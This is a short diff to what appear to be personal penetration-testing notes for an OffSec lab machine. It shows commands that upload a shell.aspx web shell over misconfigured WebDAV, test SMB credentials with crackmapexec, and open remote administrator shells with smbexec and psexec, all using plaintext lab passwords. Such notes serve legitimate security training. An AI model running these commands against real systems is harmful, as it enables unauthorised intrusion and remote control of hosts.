@@ -487,6 +487,15 @@ ldapsearch -x -h 192.168.137.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
  ***WITH VALID CREDS I CAN UPLOAD TO THE WEBSERVER DUE TO INCORRECT WEBDAV***
  curl -T '/home/bruiser/Tools/shell.aspx' 'http://192.168.137.122/' -u fmcsorley:CrabSharkJellyfish192
 ```
+##### Got a windows password
+```bash
+crackmapexec
+python3 crackmapexec.py smb 192.168.137.122 -u fmcsorley -p CrabSharkJellyfish192
+smbexec gives you a semi-interactive shell
+python3 smbexec.py administrator:h#4582Q,WoIh4b@192.168.137.122
+psexec is the best when it works
+python3 psexec.py administrator:h#4582Q,WoIh4b@192.168.137.122
+```
 
 # LINUX PRIVESC
 ##### List Current Processes
